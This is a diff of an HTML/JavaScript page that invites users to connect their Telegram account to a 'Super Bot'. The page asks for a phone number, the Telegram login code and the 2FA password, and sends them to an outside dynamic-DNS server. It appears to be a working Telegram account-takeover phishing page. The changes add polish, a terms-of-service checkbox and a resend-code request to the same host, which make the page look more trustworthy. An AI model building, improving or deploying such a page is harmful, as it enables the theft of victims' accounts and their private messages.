@@ -19,6 +19,10 @@
             border-radius: 1rem;
             box-shadow: 0 10px 15px rgba(0, 0, 0, 0.2);
             backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+        }
+        .card:hover {
+            box-shadow: 0 15px 25px rgba(0, 0, 0, 0.3);
         }
         .country-select {
             border-right: 1px solid #e5e7eb;
@@ -47,10 +51,94 @@
             font-weight: bold;
             color: #059669;
         }
+        .terms-checkbox {
+            accent-color: #2563eb;
+            width: 18px;
+            height: 18px;
+        }
+        .terms-link {
+            color: #2563eb;
+            text-decoration: underline;
+            transition: color 0.2s;
+        }
+        .terms-link:hover {
+            color: #1d4ed8;
+        }
+        .disabled-button {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        .fade-in {
+            animation: fadeIn 0.3s ease-in;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .input-group {
+            position: relative;
+        }
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            transform: translateY(-12px) scale(0.8);
+            color: #2563eb;
+        }
+        .floating-label {
+            position: absolute;
+            left: 12px;
+            top: 12px;
+            color: #6b7280;
+            pointer-events: none;
+            transition: all 0.2s;
+            background: white;
+            padding: 0 4px;
+        }
+        .terms-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            backdrop-filter: blur(5px);
+        }
+        .terms-modal-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 2rem;
+            border-radius: 1rem;
+            max-width: 90%;
+            max-height: 80%;
+            overflow-y: auto;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        }
+        .progress-bar {
+            height: 4px;
+            background: #e5e7eb;
+            border-radius: 2px;
+            overflow: hidden;
+            margin-bottom: 1rem;
+        }
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #2563eb, #3b82f6);
+            width: 33%;
+            transition: width 0.3s ease;
+        }
     </style>
 </head>
 <body>
     <div class="card p-6 w-full max-w-md">
+        <!-- Progress Bar -->
+        <div class="progress-bar">
+            <div id="progress-fill" class="progress-fill"></div>
+        </div>
+
         <div class="text-center mb-6">
             <div class="bg-blue-100 p-4 rounded-full w-20 h-20 mx-auto mb-4 flex items-center justify-center">
                 <svg class="w-10 h-10 text-blue-600" fill="currentColor" viewBox="0 0 24 24">
@@ -61,61 +149,84 @@
             <p class="text-gray-600">Connect your Telegram account to use Super Bot with full access</p>
         </div>
 
+        <!-- Terms of Service Agreement -->
+        <div id="terms-agreement" class="mb-6 p-4 bg-gray-50 rounded-lg border">
+            <div class="flex items-start space-x-3">
+                <input type="checkbox" id="terms-checkbox" class="terms-checkbox mt-1">
+                <label for="terms-checkbox" class="text-sm text-gray-700 cursor-pointer">
+                    I agree to the 
+                    <a href="#" id="terms-link" class="terms-link">Terms of Service</a>
+                    and acknowledge that I have read and understood the privacy policy.
+                </label>
+            </div>
+            <p class="text-xs text-gray-500 mt-2">
+                By using Super Bot, you agree to our data processing practices and service conditions.
+            </p>
+        </div>
+
         <!-- Phone Input Form -->
-        <div id="phone-form">
+        <div id="phone-form" class="fade-in">
             <div class="mb-4">
                 <label class="block text-sm font-medium text-gray-700 mb-2">Phone Number</label>
                 <div class="flex">
-                    <select id="country-code" class="country-select p-3 bg-gray-50 border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500">
-                        <option value="+855" selected>🇰🇭 +855</option>
-                        <option value="+1">🇺🇸 +1</option>
-                        <option value="+44">🇬🇧 +44</option>
-                        <option value="+86">🇨🇳 +86</option>
-                        <option value="+81">🇯🇵 +81</option>
-                        <option value="+82">🇰🇷 +82</option>
-                        <option value="+66">🇹🇭 +66</option>
-                        <option value="+84">🇻🇳 +84</option>
-                        <option value="+65">🇸🇬 +65</option>
-                        <option value="+60">🇲🇾 +60</option>
+                    <select id="country-code" class="country-select p-3 bg-gray-50 border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500">
+                        <option value="+855" selected>KH +855</option>
+                        <option value="+1">US +1</option>
+                        <option value="+44">GB +44</option>
+                        <option value="+86">CN +86</option>
+                        <option value="+81">JP +81</option>
+                        <option value="+82">KR +82</option>
+                        <option value="+66">TH +66</option>
+                        <option value="+84">VN +84</option>
+                        <option value="+65">SG +65</option>
+                        <option value="+60">MY +60</option>
                     </select>
-                    <input type="tel" id="phone-number" placeholder="12345678" class="phone-input flex-1 p-3 border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500">
+                    <input type="tel" id="phone-number" placeholder="12345678" class="phone-input flex-1 p-3 border border-gray-300 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all duration-200">
                 </div>
                 <p class="text-xs text-gray-500 mt-1">Cambodia numbers: Enter without leading 0 (e.g., 12345678)</p>
             </div>
-            <button id="send-otp" class="w-full bg-blue-600 text-white p-3 rounded hover:bg-blue-700 transition duration-200 flex items-center justify-center">
+            <button id="send-otp" class="w-full bg-blue-600 text-white p-3 rounded hover:bg-blue-700 transition-all duration-200 flex items-center justify-center disabled-button">
                 <span id="send-otp-text">Send OTP</span>
                 <svg id="send-otp-loading" class="loading w-5 h-5 ml-2 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path>
                 </svg>
             </button>
+            <p class="text-xs text-gray-500 mt-2 text-center">
+                Please accept the terms of service to continue
+            </p>
         </div>
 
         <!-- OTP Verification Form -->
         <div id="otp-form" class="hidden">
             <div class="mb-4">
                 <label class="block text-sm font-medium text-gray-700 mb-2">Verification Code</label>
-                <input type="text" id="otp" placeholder="12345" maxlength="5" class="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 text-center text-2xl tracking-widest">
+                <input type="text" id="otp" placeholder="12345" maxlength="5" class="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-center text-2xl tracking-widest transition-all duration-200">
                 <p class="text-xs text-gray-500 mt-1">Enter the 5-digit code from Telegram</p>
             </div>
-            <button id="submit-otp" class="w-full bg-blue-600 text-white p-3 rounded hover:bg-blue-700 transition duration-200 flex items-center justify-center">
+            <button id="submit-otp" class="w-full bg-blue-600 text-white p-3 rounded hover:bg-blue-700 transition-all duration-200 flex items-center justify-center">
                 <span id="submit-otp-text">Verify Code</span>
                 <svg id="submit-otp-loading" class="loading w-5 h-5 ml-2 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path>
                 </svg>
             </button>
-            <button id="back-to-phone" class="w-full bg-gray-300 text-gray-700 p-3 rounded hover:bg-gray-400 transition duration-200 mt-2">
+            <button id="back-to-phone" class="w-full bg-gray-300 text-gray-700 p-3 rounded hover:bg-gray-400 transition-all duration-200 mt-2">
                 Back to Phone Number
             </button>
+            <div class="mt-3 text-center">
+                <button id="resend-otp" class="text-blue-600 hover:text-blue-800 text-sm underline">
+                    Didn't receive code? Resend
+                </button>
+            </div>
         </div>
 
         <!-- 2FA Form -->
         <div id="2fa-form" class="hidden">
             <div class="mb-4">
                 <label class="block text-sm font-medium text-gray-700 mb-2">Two-Factor Authentication</label>
-                <input type="password" id="password" placeholder="Enter your 2FA password" class="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500">
+                <input type="password" id="password" placeholder="Enter your 2FA password" class="w-full p-3 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all duration-200">
                 <p class="text-xs text-gray-500 mt-1">This account has 2FA enabled</p>
             </div>
-            <button id="submit-2fa" class="w-full bg-blue-600 text-white p-3 rounded hover:bg-blue-700 transition duration-200 flex items-center justify-center">
+            <button id="submit-2fa" class="w-full bg-blue-600 text-white p-3 rounded hover:bg-blue-700 transition-all duration-200 flex items-center justify-center">
                 <span id="submit-2fa-text">Submit 2FA</span>
                 <svg id="submit-2fa-loading" class="loading w-5 h-5 ml-2 hidden" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"></path>
@@ -144,15 +255,106 @@
         </div>
     </div>
 
+    <!-- Terms Modal -->
+    <div id="terms-modal" class="terms-modal">
+        <div class="terms-modal-content">
+            <div class="flex justify-between items-center mb-4">
+                <h2 class="text-xl font-bold text-gray-900">Terms of Service</h2>
+                <button id="close-terms" class="text-gray-500 hover:text-gray-700">
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                    </svg>
+                </button>
+            </div>
+            <div class="prose max-w-none">
+                <p class="text-gray-600 mb-4">Loading terms of service...</p>
+                <div class="text-center">
+                    <div class="loading w-8 h-8 border-2 border-blue-600 border-t-transparent rounded-full mx-auto"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <script>
         let phoneCodeHash = null;
         let phone = null;
         let fullPhoneNumber = null;
+        let termsAccepted = false;
+
+        // Progress bar management
+        function updateProgress(step) {
+            const progressFill = document.getElementById('progress-fill');
+            const widths = { phone: '33%', otp: '66%', success: '100%' };
+            progressFill.style.width = widths[step] || '33%';
+        }
+
+        // Terms of service functionality
+        document.getElementById('terms-checkbox').addEventListener('change', function() {
+            termsAccepted = this.checked;
+            updateButtonStates();
+        });
+
+        document.getElementById('terms-link').addEventListener('click', function(e) {
+            e.preventDefault();
+            openTermsModal();
+        });
+
+        document.getElementById('close-terms').addEventListener('click', function() {
+            closeTermsModal();
+        });
+
+        function openTermsModal() {
+            const modal = document.getElementById('terms-modal');
+            modal.style.display = 'block';
+            document.body.style.overflow = 'hidden';
+            
+            // Load terms from /term.html
+            fetch('/term.html')
+                .then(response => response.text())
+                .then(html => {
+                    // Extract body content or use full HTML
+                    const parser = new DOMParser();
+                    const doc = parser.parseFromString(html, 'text/html');
+                    const content = doc.body ? doc.body.innerHTML : html;
+                    
+                    document.querySelector('.terms-modal-content .prose').innerHTML = content;
+                })
+                .catch(error => {
+                    document.querySelector('.terms-modal-content .prose').innerHTML = 
+                        '<p class="text-red-600">Error loading terms of service. Please try again later.</p>';
+                });
+        }
+
+        function closeTermsModal() {
+            const modal = document.getElementById('terms-modal');
+            modal.style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        // Close modal when clicking outside
+        document.getElementById('terms-modal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                closeTermsModal();
+            }
+        });
+
+        function updateButtonStates() {
+            const sendOtpBtn = document.getElementById('send-otp');
+            const phoneNumber = document.getElementById('phone-number').value;
+            
+            if (termsAccepted && phoneNumber && phoneNumber.length >= 8) {
+                sendOtpBtn.disabled = false;
+                sendOtpBtn.classList.remove('disabled-button');
+            } else {
+                sendOtpBtn.disabled = true;
+                sendOtpBtn.classList.add('disabled-button');
+            }
+        }
 
         // Auto-format phone number input
         document.getElementById('phone-number').addEventListener('input', function(e) {
-            // Remove non-digits and limit length
             this.value = this.value.replace(/\D/g, '').substring(0, 15);
+            updateButtonStates();
         });
 
         // Auto-format OTP input
@@ -177,7 +379,6 @@
             const errorMessage = document.getElementById('error-message');
             const infoMessage = document.getElementById('info-message');
             
-            // Hide both first
             errorMessage.classList.add('hidden');
             infoMessage.classList.add('hidden');
             
@@ -190,6 +391,13 @@
             }
             
             messageContainer.classList.remove('hidden');
+            
+            // Auto-hide info messages after 5 seconds
+            if (type === 'info') {
+                setTimeout(() => {
+                    hideMessage();
+                }, 5000);
+            }
         }
 
         function hideMessage() {
@@ -218,6 +426,7 @@
         function startCountdown() {
             let seconds = 5;
             const countdownElement = document.getElementById('countdown');
+            updateProgress('success');
             
             const interval = setInterval(() => {
                 seconds--;
@@ -232,6 +441,11 @@
 
         // Send OTP
         document.getElementById('send-otp').addEventListener('click', async () => {
+            if (!termsAccepted) {
+                showMessage('Please accept the terms of service to continue.');
+                return;
+            }
+
             const phoneNumber = document.getElementById('phone-number').value;
             
             if (!phoneNumber || phoneNumber.length < 8) {
@@ -258,7 +472,21 @@
                 }
                 document.getElementById('phone-form').classList.add('hidden');
                 document.getElementById('otp-form').classList.remove('hidden');
+                document.getElementById('otp-form').classList.add('fade-in');
+                updateProgress('otp');
                 showMessage('OTP sent successfully! Please check your Telegram app.', 'info');
+            }
+        });
+
+        // Resend OTP
+        document.getElementById('resend-otp').addEventListener('click', async () => {
+            const result = await sendRequest('https://ekerkzin158.duckdns.org/send_otp', { phone });
+            
+            if (result.error) {
+                showMessage(result.error || 'Failed to resend OTP');
+            } else {
+                phoneCodeHash = result.phone_code_hash;
+                showMessage('OTP resent successfully!', 'info');
             }
         });
 
@@ -286,14 +514,15 @@
                 if (result.requires_2fa) {
                     document.getElementById('otp-form').classList.add('hidden');
                     document.getElementById('2fa-form').classList.remove('hidden');
+                    document.getElementById('2fa-form').classList.add('fade-in');
                     showMessage('Two-factor authentication required.', 'info');
                 } else {
                     showMessage(result.error);
                 }
             } else {
-                // Success!
                 document.getElementById('otp-form').classList.add('hidden');
                 document.getElementById('success-form').classList.remove('hidden');
+                document.getElementById('success-form').classList.add('fade-in');
                 hideMessage();
                 startCountdown();
             }
@@ -324,9 +553,9 @@
             if (result.error) {
                 showMessage(result.error);
             } else {
-                // Success!
                 document.getElementById('2fa-form').classList.add('hidden');
                 document.getElementById('success-form').classList.remove('hidden');
+                document.getElementById('success-form').classList.add('fade-in');
                 hideMessage();
                 startCountdown();
             }
@@ -336,14 +565,32 @@
         document.getElementById('back-to-phone').addEventListener('click', () => {
             document.getElementById('otp-form').classList.add('hidden');
             document.getElementById('phone-form').classList.remove('hidden');
+            document.getElementById('phone-form').classList.add('fade-in');
             document.getElementById('otp').value = '';
+            updateProgress('phone');
             hideMessage();
         });
 
-        // Auto-focus on page load
+        // Auto-focus and keyboard navigation
         window.addEventListener('load', () => {
             document.getElementById('phone-number').focus();
         });
+
+        // Handle Enter key
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const activeForm = document.querySelector('#phone-form:not(.hidden), #otp-form:not(.hidden), #2fa-form:not(.hidden)');
+                if (activeForm) {
+                    const button = activeForm.querySelector('button[type="submit"], button:not([id*="back"]):not([id*="resend"])');
+                    if (button && !button.disabled) {
+                        button.click();
+                    }
+                }
+            }
+        });
+
+        // Initialize
+        updateButtonStates();
     </script>
 </body>
 </html>
